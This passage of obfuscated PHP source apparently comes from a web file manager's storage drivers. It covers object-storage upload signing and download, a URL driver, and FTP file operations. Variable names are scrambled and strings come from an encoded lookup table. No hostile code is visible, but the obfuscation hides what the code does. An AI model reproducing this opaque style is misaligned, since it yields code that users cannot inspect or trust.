$‰ò‘ı€‹[$£éŸî£¬[1487]]; $¸½Ğ¡Û += $éËú½îÌ; } while ($Í¤¹öÃÓ != -1); fclose($ÍûŒÜÂ±); $‡¤Ò¨ú = array($£éŸî£¬[1489], $£éŸî£¬[1490] . $‰ò‘ı€‹[$£éŸî£¬[1491]], $£éŸî£¬[1485]); $œºö§’Í = $this->ussRequest($ ·ÇŒ„, $£éŸî£¬[228], !1, $‡¤Ò¨ú); return $œºö§’Í[$£éŸî£¬[1213]] ? $this->getPathOuter($æ‡™âÇ½) : !1; } private function uploadPart($èüÎÕÚ, $ï³Ùîğ», &$ûÊ€ˆÒœ) { $·ğ§¾ûê =& $_SERVER[ĞÂ¤àÓï]; $Ô½¦¸„é = array($·ğ§¾ûê[1492], $·ğ§¾ûê[1490] . $ï³Ùîğ»[$·ğ§¾ûê[1491]], $·ğ§¾ûê[1493] . $ï³Ùîğ»[$·ğ§¾ûê[1487]], $·ğ§¾ûê[142] . $ï³Ùîğ»[$·ğ§¾ûê[1488]]); $É›å¬ø = $this->ussRequest($èüÎÕÚ, $·ğ§¾ûê[228], $ûÊ€ˆÒœ, $Ô½¦¸„é); return !$É›å¬ø[$·ğ§¾ûê[1213]] ? $É›å¬ø[$·ğ§¾ûê[1213]] : $É›å¬ø[$·ğ§¾ûê[1203]]; } public function uploadFormData($ƒäø´‰, $õòÂâ½ = 3600) { return $this->uploadPolicy($ƒäø´‰, $õòÂâ½); } public function multiUploadFormData($¡³ú˜Ü›, $»àğ³†Ó = 3600) { $ü¹ØÑ¬Ö =& $_SERVER[ĞÂ¤àÓï]; $¦×ÂŠ¹ = (int) $GLOBALS[$ü¹ØÑ¬Ö[7]][$ü¹ØÑ¬Ö[76]]; return $this->uploadPolicy($¡³ú˜Ü›, $»àğ³†Ó, $¦×ÂŠ¹); } private function uploadPolicy($Ù·äşÆš, $şšÉ™µÕ = 3600, $õğ¸ğÒä = 0) { $ãúİö¶ =& $_SERVER[ĞÂ¤àÓï]; $Òñûı† = $ãúİö¶[8] . $this->bucket; $²óœ€½¸ = gmdate($ãúİö¶[1427]); $”´Ï€º¯ = array($ãúİö¶[1494] => $this->bucket, $ãúİö¶[1495] => $Ù·äşÆš, $ãúİö¶[1496] => time() + $şšÉ™µÕ, $ãúİö¶[1497] => $²óœ€½¸); if ($õğ¸ğÒä) { $”´Ï€º¯[$ãúİö¶[1407]] = $õğ¸ğÒä; } $Ñ‚ÒÅÕÌ = base64_encode(json_encode($”´Ï€º¯)); $Ó¯Ú¯…à = base64_encode(hash_hmac($ãúİö¶[1464], "\x50\117\123\124\46{$Òñûı†}\x26{$²óœ€½¸}\46{$Ñ‚ÒÅÕÌ}", md5("{$this->userpass}"), !0)); $ù½Ï…Ú = array($ãúİö¶[1331] => $Ñ‚ÒÅÕÌ, $ãúİö¶[1498] => "\x55\120\131\x55\x4e\40{$this->username}\72{$Ó¯Ú¯…à}", $ãúİö¶[181] => $this->endpoint . $Òñûı†); return $ù½Ï…Ú; } public function download($öŠÆ®‡Ê, $»Ü´ˆ¦) { $¶ÓîÀ = IO::getPathInner(IO::mkfile($»Ü´ˆ¦)); if (!($ğØçªåİ = $this->link($öŠÆ®‡Ê))) { return !1; } $Ã²’Ğôæ = 0; $œ€ÊòÁ = 1024 * 200; $‹ÚãçÙŞ = fopen($¶ÓîÀ, $_SERVER[ĞÂ¤àÓï][1448]); while (!0) { $ñùÆœêî = $this->fileSubstr($öŠÆ®‡Ê, $Ã²’Ğôæ, $œ€ÊòÁ); if ($ñùÆœêî === !1) { return !1; } fwrite($‹ÚãçÙŞ, $ñùÆœêî); $Ã²’Ğôæ += $œ€ÊòÁ; if (strlen($ñùÆœêî) < $œ€ÊòÁ) { break; } } fclose($‹ÚãçÙŞ); return $»Ü´ˆ¦; } public function link($‚µ¼¯ÄÑ, $–ïùİÃì = array()) { $Ì›šì»” =& $_SERVER[ĞÂ¤àÓï]; $‚µ¼¯ÄÑ = trim($‚µ¼¯ÄÑ, $Ì›šì»”[8]); if (!empty($this->token)) { $©¡ŸÜàı = strtotime(date($Ì›šì»”[1499])); $ºÈÆÒ÷ä = substr(md5($this->token . $Ì›šì»”[284] . $©¡ŸÜàı . $Ì›šì»”[1500] . $‚µ¼¯ÄÑ), 12, 8) . $©¡ŸÜàı; $–ïùİÃì[] = $Ì›šì»”[1501] . $ºÈÆÒ÷ä; } $ŞŠ›Ó‘ = !empty($–ïùİÃì) ? $Ì›šì»”[73] . implode($Ì›šì»”[284], $–ïùİÃì) : $Ì›šì»”[12]; return $this->getHost() . $Ì›šì»”[8] . $‚µ¼¯ÄÑ . $ŞŠ›Ó‘; } public function fileOut($¤°ÖóÚè, $ßéŠåŞ¯ = false, $„ÊËÑÒú = false, $ò ¼•‰ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¤°ÖóÚè, $ßéŠåŞ¯, $„ÊËÑÒú, $ò ¼•‰); } if (!$„ÊËÑÒú) { $„ÊËÑÒú = $this->pathThis($¤°ÖóÚè); } $Õ¢üÌÅ˜ = $ßéŠåŞ¯ ? array($_SERVER[ĞÂ¤àÓï][1502] . rawurlencode($„ÊËÑÒú)) : array(); $ç²¢Û¿ = $this->link($¤°ÖóÚè, $Õ¢üÌÅ˜); $this->fileOutLink($ç²¢Û¿); } public function fileOutServer($ÌÅõóÛ, $Õú“¹š = false, $íáê›Ê§ = false, $áÌ›à«Í = '') { parent::fileOut($ÌÅõóÛ, $Õú“¹š, $íáê›Ê§, $áÌ›à«Í); } public function fileOutImage($Ë½££÷æ, $ñ”—İƒ¬ = 250) { $Öû®Å¾ = $this->link($Ë½££÷æ . $_SERVER[ĞÂ¤àÓï][1503] . $ñ”—İƒ¬); $this->fileOutLink($Öû®Å¾); } public function fileOutImageServer($¡ƒö‘¡², $ÈûÚ¹« = 250) { parent::fileOutImage($¡ƒö‘¡², $ÈûÚ¹«); } public function hashMd5($µõµï‡§) { $ääÓó³ñ =& $_SERVER[ĞÂ¤àÓï]; $šş”æÑÃ = $this->_objectMeta($µõµï‡§); return isset($šş”æÑÃ[$ääÓó³ñ[212]]) ? $šş”æÑÃ[$ääÓó³ñ[212]] : !1; } public function size($×ï˜€) { $«µ¼³”Ò = $this->objectMeta($×ï˜€); return $«µ¼³”Ò ? $«µ¼³”Ò[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function info($èîùÂæ) { if ($this->isFolder($èîùÂæ)) { return $this->folderInfo($èîùÂæ); } else { if ($this->isFile($èîùÂæ)) { return $this->fileInfo($èîùÂæ); } } return !1; } public function exist($…£¾€ñ€) { return $this->isFile($…£¾€ñ€) || $this->isFolder($…£¾€ñ€); } public function isFile($«Î¿›Ò«) { return !$this->isFolder($«Î¿›Ò«) && $this->objectMeta($«Î¿›Ò«); } public function isFolder($£‚òÔ®Ñ) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][165], $£‚òÔ®Ñ); } protected function objectMeta($Â¯Üö¬í) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][167], $Â¯Üö¬í); } protected function _objectMeta($—í¨Æ‡Õ) { $¹ÑØñÒ =& $_SERVER[ĞÂ¤àÓï]; if ($—í¨Æ‡Õ == $¹ÑØñÒ[12] || $—í¨Æ‡Õ == $¹ÑØñÒ[8]) { return array(); } $ºşÅ‹ªŠ = $this->ussRequest($—í¨Æ‡Õ, $¹ÑØñÒ[1504]); if (!$ºşÅ‹ªŠ[$¹ÑØñÒ[1213]]) { return null; } $Ì¹‚ı = isset($ºşÅ‹ªŠ[$¹ÑØñÒ[1203]]) ? $ºşÅ‹ªŠ[$¹ÑØñÒ[1203]] : array(); if (!isset($Ì¹‚ı[$¹ÑØñÒ[1505]])) { return null; } $¿­ùå¾ = array($¹ÑØñÒ[33] => isset($Ì¹‚ı[$¹ÑØñÒ[1505]]) ? $Ì¹‚ı[$¹ÑØñÒ[1505]] : null, $¹ÑØñÒ[76] => isset($Ì¹‚ı[$¹ÑØñÒ[1506]]) ? $Ì¹‚ı[$¹ÑØñÒ[1506]] : null, $¹ÑØñÒ[212] => isset($Ì¹‚ı[$¹ÑØñÒ[1507]]) ? $Ì¹‚ı[$¹ÑØñÒ[1507]] : null, $¹ÑØñÒ[1474] => isset($Ì¹‚ı[$¹ÑØñÒ[1508]]) ? $Ì¹‚ı[$¹ÑØñÒ[1508]] : null); $¿­ùå¾[$¹ÑØñÒ[1475]] = isset($Ì¹‚ı[$¹ÑØñÒ[1509]]) ? strtotime($Ì¹‚ı[$¹ÑØñÒ[1509]]) : $¿­ùå¾[$¹ÑØñÒ[1474]]; return $¿­ùå¾; } protected function _isFolder($ªœ‰Á§) { $ÙãÙ‹µ¥ =& $_SERVER[ĞÂ¤àÓï]; if ($ªœ‰Á§ == $ÙãÙ‹µ¥[12] || $ªœ‰Á§ == $ÙãÙ‹µ¥[8]) { return !0; } $—Ğ¤Ï = $this->_objectMeta($ªœ‰Á§); return isset($—Ğ¤Ï[$ÙãÙ‹µ¥[33]]) && $—Ğ¤Ï[$ÙãÙ‹µ¥[33]] == $ÙãÙ‹µ¥[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ü›âó–ï = false) { } public function exist($ œÚ¾•) { $ÂûÄ‡î = $this->info($ œÚ¾•); return $ÂûÄ‡î[$_SERVER[ĞÂ¤àÓï][201]]; } public function isFile($ÒõÏÚã) { $ï£ˆÑ® = $this->info($ÒõÏÚã); return $ï£ˆÑ®[$_SERVER[ĞÂ¤àÓï][201]]; } public function isFolder($„ÆÔ¡ôƒ) { return !1; } public function size($ìÚ§òÌ) { $ÂÄ¼„Ôğ = $this->info($ìÚ§òÌ); return $ÂÄ¼„Ôğ[$_SERVER[ĞÂ¤àÓï][76]]; } public function info($ğöí‡Ÿ–) { return $this->infoParse($ğöí‡Ÿ–); } public function infoAuth($³§ÜñÈ) { return $this->infoParse($³§ÜñÈ); } public function infoWithChildren($½šÀ–Şñ) { return $this->infoParse($½šÀ–Şñ); } public function infoFull($Ô¡‹ÂÏŒ) { return $this->infoParse($Ô¡‹ÂÏŒ); } private function infoParse($í¯…ÚÓÜ) { $•™üğ­ü =& $_SERVER[ĞÂ¤àÓï]; $•ÌÜ‡¡° = $this->header($í¯…ÚÓÜ); if (!$•ÌÜ‡¡° || !$•ÌÜ‡¡°[$•™üğ­ü[749]]) { return !1; } $û¹‚‘ŸÌ = _get($•ÌÜ‡¡°, $•™üğ­ü[337], 0); $¤ÑÉĞî£ = array($•™üğ­ü[32] => $•ÌÜ‡¡°[$•™üğ­ü[32]], $•™üğ­ü[84] => $í¯…ÚÓÜ, $•™üğ­ü[33] => $•™üğ­ü[199], $•™üğ­ü[76] => intval($û¹‚‘ŸÌ), $•™üğ­ü[174] => get_path_ext($•ÌÜ‡¡°[$•™üğ­ü[32]]), $•™üğ­ü[1388] => $û¹‚‘ŸÌ > 0 && $•ÌÜ‡¡°[$•™üğ­ü[1510]], $•™üğ­ü[1389] => !1); return $¤ÑÉĞî£; } private function header($âİòçòı) { $˜Êêê  =& $_SERVER[ĞÂ¤àÓï]; if (isset(self::$_cacheHeader[$âİòçòı])) { return self::$_cacheHeader[$âİòçòı]; } $ı»ù÷¿† = isset($GLOBALS[$˜Êêê [1511]]) ? $GLOBALS[$˜Êêê [1511]] : !1; $GLOBALS[$˜Êêê [1511]] = !0; self::$_cacheHeader[$âİòçòı] = url_header($âİòçòı); $GLOBALS[$˜Êêê [1511]] = $ı»ù÷¿†; return self::$_cacheHeader[$âİòçòı]; } public function hashSimple($½Ÿä¯°, $‹‰«‚Ÿí = false) { $§ì£çº =& $_SERVER[ĞÂ¤àÓï]; $ÅÃ®èäŸ = $this->info($½Ÿä¯°); if (!$ÅÃ®èäŸ || !$ÅÃ®èäŸ[$§ì£çº[201]]) { return !1; } $ùŞû’îÇ = $ÅÃ®èäŸ[$§ì£çº[76]]; $ÁÏÕñ¸ = 200; $É¸Šõıô = 50; if ($ùŞû’îÇ <= $ÁÏÕñ¸ * $É¸Šõıô) { return md5($this->fileSubstr($½Ÿä¯°, 0, $ùŞû’îÇ)) . $ùŞû’îÇ; } $°²ŸÕë = intval($ùŞû’îÇ / $É¸Šõıô); $°àµîÕº = $§ì£çº[12]; $¨ª±¯ÌŠ = timeFloat(); $ÎÜ‰Îøî = 15; for ($ë¹ÉÕæÙ = 0; $ë¹ÉÕæÙ < $É¸Šõıô; $ë¹ÉÕæÙ++) { if (timeFloat() - $¨ª±¯ÌŠ > $ÎÜ‰Îøî) { return !1; } $ÌÏéàşÛ = $this->fileSubstr($½Ÿä¯°, $°²ŸÕë * $ë¹ÉÕæÙ, $ÁÏÕñ¸); if (!$ÌÏéàşÛ) { return !1; } $°àµîÕº .= $ÌÏéàşÛ; } $°àµîÕº .= $this->fileSubstr($½Ÿä¯°, $ùŞû’îÇ - $ÁÏÕñ¸, $ÁÏÕñ¸); return md5($°àµîÕº) . $ùŞû’îÇ; } public function getContent($çİø¨ÆØ) { return $this->fileSubstr($çİø¨ÆØ); } public function fileSubstr($×÷¥‹İ, $¾şøÙÓè = 0, $àõÓëº¿ = -1) { $Ú¹óêµ =& $_SERVER[ĞÂ¤àÓï]; $ñğç‘Œ = $this->info($×÷¥‹İ); if (!$ñğç‘Œ || !$ñğç‘Œ[$Ú¹óêµ[201]] && $ñğç‘Œ[$Ú¹óêµ[76]] > 1024 * 1024 * 10) { return !1; } if ($àõÓëº¿ === -1) { $àõÓëº¿ = $ñğç‘Œ[$Ú¹óêµ[76]]; } if ($àõÓëº¿ == 0) { return $Ú¹óêµ[12]; } $¸Æ¿¶·¿ = array($Ú¹óêµ[1512] . $¾şøÙÓè . $Ú¹óêµ[789] . ($¾şøÙÓè + $àõÓëº¿ - 1)); $Ğ‰¢Î·™ = url_request($×÷¥‹İ, $Ú¹óêµ[230], !1, $¸Æ¿¶·¿, !1, !1, 30); return $Ğ‰¢Î·™[$Ú¹óêµ[1203]] ? $Ğ‰¢Î·™[$Ú¹óêµ[1203]] : $Ú¹óêµ[12]; } public function download($úØ”‘´â, $Ì¼é¼Ô) { Downloader::start($úØ”‘´â, $Ì¼é¼Ô); return $Ì¼é¼Ô; } } goto c×±ĞŞƒ¿²; f‰‡âêö™ë: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($—¢«Ò˜æ) { parent::__construct(); if (count($—¢«Ò˜æ) > 0) { $this->_init($—¢«Ò˜æ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ãô·–ÅÎ) { $ı­òĞ·Œ =& $_SERVER[ĞÂ¤àÓï]; global $config; $this->appCharset = $config[$ı­òĞ·Œ[1374]]; $this->systemCharset = $config[$ı­òĞ·Œ[1375]]; if (isset($ãô·–ÅÎ[$ı­òĞ·Œ[1376]]) && $ãô·–ÅÎ[$ı­òĞ·Œ[1376]]) { $this->systemCharset = $ãô·–ÅÎ[$ı­òĞ·Œ[1376]]; } } public function iconvApp($‹§™áéÂ) { return $this->iconvTo($‹§™áéÂ, $this->systemCharset, $this->appCharset); } public function iconvSystem($´…Û‰ÜÂ) { return $this->iconvTo($´…Û‰ÜÂ, $this->appCharset, $this->systemCharset); } public function getPathOuter($òåÄ¤‚È) { $¸÷êÅ² =& $_SERVER[ĞÂ¤àÓï]; $‚ÁÎê³æ = $this->iconvApp($this->pathBase); $òåÄ¤‚È = $this->iconvApp($òåÄ¤‚È); if (substr($‚ÁÎê³æ, 0, 2) == $¸÷êÅ²[1377]) { $‚ÁÎê³æ = BASIC_PATH . substr($‚ÁÎê³æ, 2); } if (substr($òåÄ¤‚È, 0, 2) == $¸÷êÅ²[1377]) { $òåÄ¤‚È = BASIC_PATH . substr($òåÄ¤‚È, 2); } $‚ÁÎê³æ = KodIO::clear($‚ÁÎê³æ); $òåÄ¤‚È = KodIO::clear($òåÄ¤‚È); $òåÄ¤‚È = substr($òåÄ¤‚È, strlen($‚ÁÎê³æ)); if (empty($this->pathDriver)) { return $òåÄ¤‚È; } return $this->pathDriver . $¸÷êÅ²[8] . ltrim($òåÄ¤‚È, $¸÷êÅ²[8]); } private function _init($ß‚ñ½• = array()) { $ÏÜÓš›Œ =& $_SERVER[ĞÂ¤àÓï]; if (!function_exists($ÏÜÓš›Œ[1378])) { throw new Exception(LNG($ÏÜÓš›Œ[1379])); } $this->config = $ß‚ñ½•; $this->charsetReset($ß‚ñ½•); foreach ($ß‚ñ½• as $¶‹¿õĞ‚ => $ÃÖ§È‡˜) { if (isset($this->{$¶‹¿õĞ‚})) { $this->{$¶‹¿õĞ‚} = $ÃÖ§È‡˜; } } return $this->_login($ß‚ñ½•); } private function _login($çµû¢Õ•) { $ë­åÊÖ‘ =& $_SERVER[ĞÂ¤àÓï]; static $ö‹İáş = array(); $…ŒÌŸ» = md5(json_encode($çµû¢Õ•)); if (isset($ö‹İáş[$…ŒÌŸ»])) { foreach ($ö‹İáş[$…ŒÌŸ»] as $èœâëÑ => $÷™º­£ ) { $this->{$èœâëÑ} = $÷™º­£ ; } return !0; } $Û¬Ô© = parse_url(trim($this->server, $ë­åÊÖ‘[8])); $this->host = $Û¬Ô©[$ë­åÊÖ‘[181]]; $Ò°²±à = isset($Û¬Ô©[$ë­åÊÖ‘[180]]) && $Û¬Ô©[$ë­åÊÖ‘[180]] == $ë­åÊÖ‘[1380] ? !0 : !1; $this->scheme = $Ò°²±à ? $ë­åÊÖ‘[1381] : $ë­åÊÖ‘[1382]; $this->port = isset($Û¬Ô©[$ë­åÊÖ‘[182]]) ? $Û¬Ô©[$ë­åÊÖ‘[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $÷ª¥ÙÅ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $€­×ï»Ñ = $this->pasv == $ë­åÊÖ‘[88] ? !0 : !1; @ftp_pasv($this->connect, $€­×ï»Ñ); $ö‹İáş[$…ŒÌŸ»] = array($ë­åÊÖ‘[1383] => $this->connect, $ë­åÊÖ‘[181] => $this->host, $ë­åÊÖ‘[180] => $this->scheme, $ë­åÊÖ‘[182] => $this->port); return $÷ª¥ÙÅ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($°öÖËÚı, $ñ¸ËíŞ = '', $ ÔÌ‘‚À = REPEAT_RENAME) { if ($this->setContent($°öÖËÚı, $ñ¸ËíŞ)) { return $this->getPathOuter($°öÖËÚı); } return !1; } public function mkdir($Üåª¼¨, $ÖÛÈ¸ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Üåª¼¨ = $this->iconvSystem($Üåª¼¨); if ($this->_isFolder($Üåª¼¨) || @ftp_mkdir($this->connect, $Üåª¼¨)) { return $this->getPathOuter($Üåª¼¨); } if (!$this->mkdir($this->pathFather($Üåª¼¨))) { return !1; } if ($Üåª¼¨ = @ftp_mkdir($this->connect, $Üåª¼¨)) { return $this->getPathOuter($Üåª¼¨); } return !1; } public function copyFile($®“šùëÀ, $êç¡×»Œ) { if (!$this->_isconn()) { return !1; } $«Ãñáóâ = $this->pathThis($this->iconvSystem($®“šùëÀ)); $ØÓÚßÕé = $this->tempFile($«Ãñáóâ); $ĞßáŸ‰ß = $this->iconvApp($ØÓÚßÕé); $this->download($®“šùëÀ, $ĞßáŸ‰ß); $¿ùøø•² = $this->upload($êç¡×»Œ, $ĞßáŸ‰ß); $this->tempFileRemve($ØÓÚßÕé); return $¿ùøø•²; } public function moveFile($Œ‘ä…¼æ, $œÀ†ò´) { if (!$this->_isconn()) { return !1; } $Œ‘ä…¼æ = $this->iconvSystem($Œ‘ä…¼æ); $œÀ†ò´ = $this->iconvSystem($œÀ†ò´); $§‘©ë¯‘ = @ftp_rename($this->connect, $Œ‘ä…¼æ, $œÀ†ò´); return $§‘©ë¯‘ ? $this->getPathOuter($œÀ†ò´) : !1; } public function delFile($·ä¸ˆÍå) { if (!$this->_isconn()) { return !1; } $·ä¸ˆÍå = $this->iconvSystem($·ä¸ˆÍå); return @ftp_delete($this->connect, $·ä¸ˆÍå); } public function delFolder($ãÇíãíû) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ö‚¶›ËÈ = $«­¢šğó = array(); $this->fileList($ãÇíãíû, $Ö‚¶›ËÈ, $«­¢šğó, !0); $this->listItemCache = !0; foreach ($«­¢šğó as $Àã»«ó³) { $ŠÒŒ‡®Ÿ = $this->iconvSystem($Àã»«ó³[$_SERVER[ĞÂ¤àÓï][32]]); $ÚÑ’ÚÃÁ = @ftp_delete($this->connect, $ŠÒŒ‡®Ÿ); if (!$ÚÑ’ÚÃÁ) { return !1; } } foreach ($Ö‚¶›ËÈ as $ŠÒŒ‡®Ÿ) { $ŠÒŒ‡®Ÿ = $this->iconvSystem($ŠÒŒ‡®Ÿ); $ÚÑ’ÚÃÁ = @ftp_rmdir($this->connect, $ŠÒŒ‡®Ÿ); if (!$ÚÑ’ÚÃÁ) { return !1; } } $ãÇíãíû = $this->iconvSystem($ãÇíãíû); return @ftp_rmdir($this->connect, $ãÇíãíû); } public function rename($íÏ½Á¤Ï, $Õüı±¯) { $îí‡·ƒ€ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->_isconn()) { return !1; } $¤Æî˜È = $this->fileNameAuto($this->pathFather($íÏ½Á¤Ï), $Õüı±¯); $¤Æî˜È = $this->iconvSystem($¤Æî˜È); $íÏ½Á¤Ï = $this->iconvSystem($íÏ½Á¤Ï); $É«§¼óâ = $this->pathFather($íÏ½Á¤Ï); $ÁÀ•á„§ = rtrim($É«§¼óâ, $îí‡·ƒ€[8]) . $îí‡·ƒ€[8] . $¤Æî˜È; $³¹§¢ä¹ = @ftp_rename($this->connect, $íÏ½Á¤Ï, $ÁÀ•á„§); $ÁÀ•á„§ = $this->iconvApp($ÁÀ•á„§); return $³¹§¢ä¹ ? $this->getPathOuter($ÁÀ•á„§) : !1; } private function folderInfo($ÒûÁãáË, $Ç¾æ¢éÍ = false) { $í¾½ı¾“ =& $_SERVER[ĞÂ¤àÓï]; $ïäñ ¾à = array($í¾½ı¾“[32] => $this->pathThis($ÒûÁãáË), $í¾½ı¾“[84] => $this->getPathOuter($í¾½ı¾“[8] . $ÒûÁãáË), $í¾½ı¾“[33] => $í¾½ı¾“[75]); if ($Ç¾æ¢éÍ) { return $ïäñ ¾à; } $ïäñ ¾à[$í¾½ı¾“[200]] = $ïäñ ¾à[$í¾½ı¾“[85]] = 0; $ïäñ ¾à[$í¾½ı¾“[201]] = $ïäñ ¾à[$í¾½ı¾“[202]] = !0; return $ïäñ ¾à; } private function fileInfo($ª²‡Ü¥ö, $Ûõş˜•¿ = false, $ûÉØóĞ´ = array()) { $›û’ı’ =& $_SERVER[ĞÂ¤àÓï]; $¡®¨†·İ = array($›û’ı’[32] => $this->pathThis($ª²‡Ü¥ö), $›û’ı’[84] => $this->getPathOuter($›û’ı’[8] . $ª²‡Ü¥ö), $›û’ı’[33] => $›û’ı’[199], $›û’ı’[76] => isset($ûÉØóĞ´[$›û’ı’[76]]) ? $ûÉØóĞ´[$›û’ı’[76]] : 0, $›û’ı’[174] => $this->ext($ª²‡Ü¥ö)); if ($Ûõş˜•¿) { return $¡®¨†·İ; } $¡®¨†·İ[$›û’ı’[200]] = $¡®¨†·İ[$›û’ı’[85]] = 0; $¡®¨†·İ[$›û’ı’[201]] = $¡®¨†·İ[$›û’ı’[202]] = !0; $ïÜÂóÇÕ = $this->iconvSystem($ª²‡Ü¥ö); $¡®¨†·İ[$›û’ı’[85]] = @ftp_mdtm($this->connect, $ïÜÂóÇÕ); if (empty($ûÉØóĞ´)) { $ûÉØóĞ´ = $this->objectMeta($ª²‡Ü¥ö); if (!$ûÉØóĞ´) { return $¡®¨†·İ; } } $¡®¨†·İ[$›û’ı’[76]] = $ûÉØóĞ´[$›û’ı’[76]]; return $¡®¨†·İ; } public function size($‡Ï”µóÑ) { $Ê¥‹¿´© = $this->objectMeta($‡Ï”µóÑ); return $Ê¥‹¿´© ? $Ê¥‹¿´©[$_SERVER[ĞÂ¤àÓï][76]] : 0; } public function info($¼òÊÑñ¢) { if ($this->isFile($¼òÊÑñ¢)) { return $this->fileInfo($¼òÊÑñ¢, 0); } else { if ($this->isFolder($¼òÊÑñ¢)) { return $this->folderInfo($¼òÊÑñ¢); } } return !1; } private function fileList($Å²„Ğ´, &$Ü¯ÇòÖ, &$•ü”×É, $«»é–êó = false) { $Ë²Éè£Ÿ =& $_SERVER[ĞÂ¤àÓï]; $Å²„Ğ´ = $this->iconvSystem($Å²„Ğ´); if (!$this->isFolder($Å²„Ğ´)) { return !1; } @ftp_chdir($this->connect, $Ë²Éè£Ÿ[8]); $Å²„Ğ´ = rtrim($Å²„Ğ´, $Ë²Éè£Ÿ[8]) . $Ë²Éè£Ÿ[8]; check_abort(); $ø¿øŠåŒ = @ftp_rawlist($this->connect, $Å²„Ğ´); if (!$ø¿øŠåŒ) { $ø¿øŠåŒ = array(); } $ó˜¾°ş = array($Ë²Éè£Ÿ[10] => 1, $Ë²Éè£Ÿ[1384] => 1); foreach ($ø¿øŠåŒ as $‚ñÀ”å) { $ìŞÜíÖ« = $this->_listItem($‚ñÀ”å); if ($ìŞÜíÖ«[0] == $Ë²Éè£Ÿ[758]) { continue; } $çŠ—î¨® = $ìŞÜíÖ«[8]; if (empty($çŠ—î¨®) && $çŠ—î¨® !== $Ë²Éè£Ÿ[197] || isset($ó˜¾°ş[$çŠ—î¨®])) { continue; } $çŠ—î¨® = $this->iconvApp($Å²„Ğ´ . ltrim($çŠ—î¨®, $Ë²Éè£Ÿ[8])); $˜¯®å‚Í = array($Ë²Éè£Ÿ[32] => $çŠ—î¨®, $Ë²Éè£Ÿ[33] => $Ë²Éè£Ÿ[199], $Ë²Éè£Ÿ[76] => $ìŞÜíÖ«[4]); if (substr($‚ñÀ”å, 0, 1) == $Ë²Éè£Ÿ[1385]) { $˜¯®å‚Í[$Ë²Éè£Ÿ[33]] = $Ë²Éè£Ÿ[75]; $˜¯®å‚Í[$Ë²Éè£Ÿ[76]] = 0; } $š–ô»‰€ = $˜¯®å‚Í[$Ë²Éè£Ÿ[33]] == $Ë²Éè£Ÿ[75] ? !0 : !1; $this->cacheMethodInfoSet($çŠ—î¨®, $š–ô»‰€, $˜¯®å‚Í); if ($š–ô»‰€) { $Ü¯ÇòÖ[] = $çŠ—î¨®; if ($«»é–êó) { $this->fileList($çŠ—î¨®, $Ü¯ÇòÖ, $•ü”×É, $«»é–êó); } continue; } $•ü”×É[] = $˜¯®å‚Í; } $this->cacheMethodInfoSet($Å²„Ğ´, !0); } private function _listItem($Õù´üö”) { if (empty($Õù´üö”)) { return array(); } $•ú‡îõ = preg_split($_SERVER[ĞÂ¤àÓï][1386], $Õù´üö”); if (count($•ú‡îõ) <= 9) { return $•ú‡îõ; } $•ú‡îõ[8] = trim(substr($Õù´üö”, strpos($Õù´üö”, $•ú‡îõ[7]) + strlen($•ú‡îõ[7]))); return array_splice($•ú‡îõ, 0, 9); } public function listPath($Œ½ûèò², $íÎ¬Ò‰¿ = false) { $«Ì¢¸ˆ‡ =& $_SERVER[ĞÂ¤àÓï]; if (!$this->_isconn()) { return !1; } $†¬Áæı© = $‚¤ñÊË = array(); $this->fileList($Œ½ûèò², $†¬Áæı©, $‚¤ñÊË); foreach ($†¬Áæı© as $†¤“ŒĞ³ => $µïëÅçÈ) { $†¬Áæı©[$†¤“ŒĞ³] = $this->folderInfo($µïëÅçÈ, $íÎ¬Ò‰¿); } foreach ($‚¤ñÊË as $†¤“ŒĞ³ => $µïëÅçÈ) { $‚¤ñÊË[$†¤“ŒĞ³] = $this->fileInfo($µïëÅçÈ[$«Ì¢¸ˆ‡[32]], $íÎ¬Ò‰¿, $µïëÅçÈ); } return array($«Ì¢¸ˆ‡[82] => $†¬Áæı©, $«Ì¢¸ˆ‡[83] => $‚¤ñÊË); } public function has($€ Œ“×“, $˜¦´é£¡ = false, $Ò øÄ¬ó = true) { $áÁôÊ“Ä =& $_SERVER[ĞÂ¤àÓï]; $™ğÒÃ = $”É‘àúÀ = array(); $—è”ÛÙ = $˜¦´é£¡ ? !0 : !1; $this->fileList($€ Œ“×“, $™ğÒÃ, $”É‘àúÀ, $—è”ÛÙ); if ($˜¦´é£¡) { return array($áÁôÊ“Ä[207] => count($”É‘àúÀ), $áÁôÊ“Ä[208] => count($™ğÒÃ)); } if ($Ò øÄ¬ó) { if (count($”É‘àúÀ)) { return !0; } } else { if (count($™ğÒÃ)) { return !0; } } return !1; } public function listAll($À¼º—È) { $Ÿ¤ñ´è =& $_SERVER[ĞÂ¤àÓï]; if (!$this->_isconn()) { return !1; } $äî¢×—º = $Ã™ìá ¹ = array(); $this->fileList($À¼º—È, $äî¢×—º, $Ã™ìá ¹, !0); $ß•è°îô = array(); foreach ($Ã™ìá ¹ as $úÎ¶¿“ˆ) { $ß•è°îô[$úÎ¶¿“ˆ[$Ÿ¤ñ´è[32]]] = $úÎ¶¿“ˆ[$Ÿ¤ñ´è[76]]; } foreach ($äî¢×—º as $úÎ¶¿“ˆ) { if (is_string($úÎ¶¿“ˆ)) { $ß•è°îô[$úÎ¶¿“ˆ] = 0; } } return $this->listAllFiles($À¼º—È, array_keys($ß•è°îô), $ß•è°îô); } public function getContent($é¤ú›²Ö) { if (!$this->_isconn()) { return !1; } $é¤ú›²Ö = $this->iconvSystem($é¤ú›²Ö); return $this->fileSubstr($é¤ú›²Ö); } public function setContent($‚ÏçŠêş, $£ŞˆœÍÄ = '') { if 